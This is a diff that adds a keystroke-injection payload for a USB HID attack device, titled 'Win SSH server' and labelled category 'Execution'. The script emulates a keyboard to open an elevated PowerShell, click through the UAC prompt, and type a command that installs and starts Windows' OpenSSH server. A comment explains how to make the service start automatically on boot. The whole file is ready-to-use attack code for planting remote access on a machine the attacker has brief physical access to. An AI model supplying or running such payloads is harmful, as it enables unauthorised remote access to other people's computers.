@@ -1,0 +1,27 @@
+# Title:       	Win SSH server
+# Description:  Installs and runs a SSH Server on Windows.  
+# Author:       Cribbit
+# Version:      1.0
+# Category:     Execution
+# Target:       Windows 10 Creators Update (Powershell 5.1+)
+# Attackmodes:  HID
+# Requirements: Admin Privileges and an Online Connection
+# Notes:        Add ` -StartupType 'Automatic'` after Start-Service to start ssh on boot
+
+LED SETUP
+ATTACKMODE HID
+
+LED ATTACK
+Q DELAY 200
+# Admin Powershell need Windows 10 Creators Update
+Q GUI x
+Q STRING a
+sleep 2
+# Q ALT y this work for EN y=yes
+# This works for all languages
+Q LEFT
+Q ENTER
+sleep 5
+Q STRING "Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Server*' | ? State -EQ 'NotPresent' | % {Add-WindowsCapability -Online -Name \$_.Name}; Start-Service sshd"
+# Q ENTER 
+LED FINISH
